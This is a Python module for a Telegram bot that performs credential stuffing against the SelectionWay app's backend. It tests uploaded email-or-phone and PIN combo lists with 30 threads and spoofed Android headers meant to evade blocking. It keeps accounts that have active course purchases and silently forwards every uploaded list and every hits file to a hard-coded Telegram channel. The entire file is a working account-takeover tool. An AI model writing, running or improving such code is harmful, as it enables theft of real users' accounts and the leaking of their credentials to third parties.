import requests
import time
import os
import asyncio
import logging
import re
from concurrent.futures import ThreadPoolExecutor
from telegram import Update
from telegram.ext import ContextTypes

# ✅ Logging ko INFO level par set kiya hai taaki exact failure reason dikhe
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ==============================================================================
# SMART PARSER (Improved with Strict Regex Validation)
# ==============================================================================
def parse_combo(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    # Determine separator safely (Fix: rsplit(':', 1) ensures password with ':' is handled)
    if '*' in line and ':' not in line:
        parts = line.rsplit('*', 1)
    else:
        parts = line.rsplit(':', 1) 
    
    if len(parts) == 2:
        username = parts[0].strip()
        password = parts[1].strip()
        
        # Clean username
        if " " in username:
            username = username.split()[-1]
        if username.startswith('+91'):
            username = username[3:]
        if username.isdigit() and len(username) > 10:
            username = username[-10:]
            
        # Strict validation: MUST be a valid email or exactly 10-digit phone number
        # This filters out garbage lines like "//t.me/..." that trigger WAF 403 blocks
        is_email = bool(re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', username))
        is_phone = bool(re.match(r'^\d{10}$', username))
        
        if not (is_email or is_phone):
            return None
            
        return username, password
    return None


# ==============================================================================
# CHECKER CLASS
# ==============================================================================
class Checker:
    # ============ BOT CONFIG ============
    command = "selway"
    name = "SelectionWay"
    # ====================================

    async def handle_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data['awaiting_file_for'] = self.command
        await update.message.reply_text(
            f"📂 <b>{self.name} Ultra-Fast Checker Ready!</b>\n\n"
            f"Ab apna <code>combo.txt</code> file bhejo.\n"
            f"💡 <b>Smart Parse:</b> ':', '*', '+91' auto-handle + <b>Strict Email/Phone Validation</b>.\n"
            f"⚠️ <b>Strict Filter:</b> Sirf <b>ACTIVE (Purchased)</b> courses wale accounts HIT honge.\n"
            f"⚡ <b>Anti-Block:</b> Real Android App headers ke sath 30 Threads.\n"
            f"🛑 Beech mein rokna ho toh <code>/stop</code> type kar do.",
            parse_mode="HTML"
        )

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        progress_msg = await update.message.reply_text("⏳ File download kar raha hoon aur check start kar raha hoon...")
        
        file = await update.message.document.get_file()
        original_file_name = update.message.document.file_name or "combo.txt"
        temp_input_file = f"temp_input_{update.effective_user.id}_{int(time.time())}.txt"
        await file.download_to_drive(temp_input_file)
        
        with open(temp_input_file, 'r', encoding='utf-8-sig', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
            
        total = len(lines)
        if total == 0:
            await progress_msg.edit_text("❌ File khali hai ya valid nahi hai!")
            if os.path.exists(temp_input_file): os.remove(temp_input_file)
            return

        stats = {'checked': 0, 'hits': 0, 'failed': 0, 'hit_details': []}
        context.user_data[f'stats_{self.command}'] = stats
        context.user_data['stop_checking'] = False

        asyncio.create_task(self.run_checker(update, context, temp_input_file, original_file_name, lines, total, progress_msg))

    async def run_checker(self, update, context, temp_input_file, original_file_name, lines, total, progress_msg):
        max_workers = 30
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            chunk_size = 30
            
            for i in range(0, total, chunk_size):
                if context.user_data.get('stop_checking', False): break
                
                chunk = lines[i:i+chunk_size]
                futures = [executor.submit(self.check_single, line) for line in chunk]
                
                for future in futures:
                    if context.user_data.get('stop_checking', False): break
                    
                    result = future.result()
                    stats = context.user_data[f'stats_{self.command}']
                    stats['checked'] += 1
                    
                    if result['status'] == 'hit':
                        stats['hits'] += 1
                        stats['hit_details'].append(result['data'])
                    else:
                        stats['failed'] += 1
                
                if context.user_data.get('stop_checking', False): break
                
                stats = context.user_data[f'stats_{self.command}']
                progress_text = (
                    f"🔄 <b>{self.name} Checking...</b>\n\n"
                    f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
                    f"🔥 Active Hits: {stats['hits']}\n"
                    f"❌ Failed/Skipped: {stats['failed']}\n⏳ Remaining: {total - stats['checked']}"
                )
                try:
                    await progress_msg.edit_text(progress_text, parse_mode="HTML")
                except Exception:
                    pass
                
                await asyncio.sleep(0.1)

        # ============ FINAL CLEANUP & SUMMARY ============
        stats = context.user_data.get(f'stats_{self.command}', {'checked': 0, 'hits': 0, 'failed': 0, 'hit_details': []})
        is_stopped = context.user_data.get('stop_checking', False)
        
        context.user_data.pop('stop_checking', None)
        context.user_data.pop('awaiting_file_for', None)
        context.user_data.pop(f'stats_{self.command}', None)
        
        user_name = update.effective_user.username or f"User_{update.effective_user.id}"
        app_filename = f"{self.name}.txt"
        
        status_emoji = "🛑" if is_stopped else "🎉"
        status_text = "User dwara STOP kar diya gaya!" if is_stopped else "Checking Completed!"
        
        user_caption = (
            f"{status_emoji} {self.name} - {status_text}\n\n"
            f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
            f"🔥 Active Hits: {stats['hits']}\n❌ Failed/Skipped: {stats['failed']}"
        )
        
        log_original_caption = f"🎉 {self.name} Checker\n👤 User: @{user_name}"
        log_hits_caption = (
            f"👤 User: @{user_name}\n\n"
            f"{status_emoji} {self.name} - {status_text}\n\n"
            f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
            f"🔥 Active Hits: {stats['hits']}\n❌ Failed/Skipped: {stats['failed']}"
        )
        
        if stats['hits'] > 0:
            hits_temp_file = f"hits_temp_{update.effective_user.id}_{int(time.time())}.txt"
            with open(hits_temp_file, 'w', encoding='utf-8') as f:
                for hit in stats['hit_details']: 
                    f.write(hit + "\n")
            
            try:
                await progress_msg.delete()
            except Exception:
                pass
            
            await update.message.reply_document(
                document=open(hits_temp_file, 'rb'),
                filename=app_filename,
                caption=user_caption
            )
            
            try:
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,
                    caption=log_original_caption
                )
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(hits_temp_file, 'rb'),
                    filename=app_filename,
                    caption=log_hits_caption
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")
                
            if os.path.exists(hits_temp_file):
                os.remove(hits_temp_file)
        else:
            await progress_msg.edit_text(
                f"{user_caption}\n\n❌ Koi bhi Active Hit nahi mila.\n💡 <i>Check Heroku logs for exact failure reasons.</i>", 
                parse_mode="HTML"
            )
            
            try:
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,
                    caption=f"{log_original_caption}\n(0 Hits)"
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")

        if os.path.exists(temp_input_file):
            os.remove(temp_input_file)

    def check_single(self, line):
        parsed = parse_combo(line)
        if not parsed:
            return {'status': 'failed'} # Skipped invalid format
        
        ident, password = parsed

        base_url = "https://backend.opsolve.xyz"
        
        # ✅ Anti-Block Headers: Mimics real Android App exactly
        headers = {
            "Host": "backend.opsolve.xyz",
            "Accept": "application/json, text/plain, */*",
            "x-app-version": "4.0.8",
            "User-Agent": "SelectionWayxTestRanking/4.0.8 (Linux; Android 11; SM-G991B) okhttp/4.9.3",
            "Content-Type": "application/json",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "Keep-Alive"
        }

        is_email = "@" in ident
        
        if is_email:
            payload = {"email": ident, "pin": password, "fcm_token": None}
        else:
            payload = {"phone_number": ident, "pin": password, "fcm_token": None}

        session = requests.Session()
        try:
            # 1. Login Request
            res = session.post(f"{base_url}/api/v1/auth/v2/login-with-pin", headers=headers, json=payload, timeout=15)
            
            if res.status_code != 200:
                logger.warning(f"[{ident}] Login Status {res.status_code} | Resp: {res.text[:150]}")
                return {'status': 'failed'}
            
            try:
                result = res.json()
            except Exception:
                logger.warning(f"[{ident}] Invalid JSON Response | Resp: {res.text[:150]}")
                return {'status': 'failed'}
                
            if result.get("status") != "success":
                logger.warning(f"[{ident}] Login Failed: {result.get('message')}")
                return {'status': 'failed'}
                
            d = result.get("data", {})
            token = d.get("token")
            uid = d.get("id")
            
            if not token or not uid:
                logger.warning(f"[{ident}] Login Success but missing token/uid | Resp: {result}")
                return {'status': 'failed'}

            # 2. Fetch Purchases Request
            purchases_headers = dict(headers)
            purchases_headers["authorization"] = f"Bearer {token}"
            purchases_headers["userid"] = str(uid)
            
            res_purchases = session.get(f"{base_url}/api/v1/my-purchases", headers=purchases_headers, timeout=15)
            
            if res_purchases.status_code != 200:
                logger.warning(f"[{ident}] Purchases Status {res_purchases.status_code} | Resp: {res_purchases.text[:150]}")
                return {'status': 'failed'}
                
            try:
                purchases_data = res_purchases.json()
            except Exception:
                logger.warning(f"[{ident}] Purchases Invalid JSON | Resp: {res_purchases.text[:150]}")
                return {'status': 'failed'}
                
            purchases = purchases_data.get("data", []) if purchases_data.get("status") == "success" else []
            
            if not purchases:
                logger.info(f"[{ident}] Login Success but NO PURCHASES found.")
                return {'status': 'failed'}
                
            # Format hit
            hit_text = f"🔐 Details : {ident}*{password}\n📚 Total Purchases: {len(purchases)}\n"
            for idx, p in enumerate(purchases, 1):
                name = p.get('name', 'Unknown Course')
                expiry = p.get('expiry', 'N/A')
                order_id = p.get('orderId', 'N/A')
                hit_text += f"📖 {idx}. {name}\n   📦 Order ID: {order_id} | ⏳ Expiry: {expiry}\n"
            hit_text += "\n" + "-" * 60 + "\n"
            
            return {'status': 'hit', 'data': hit_text}
            
        except Exception as e:
            logger.warning(f"[{ident}] Exception: {e}")
            return {'status': 'failed'}
        finally:
            session.close()
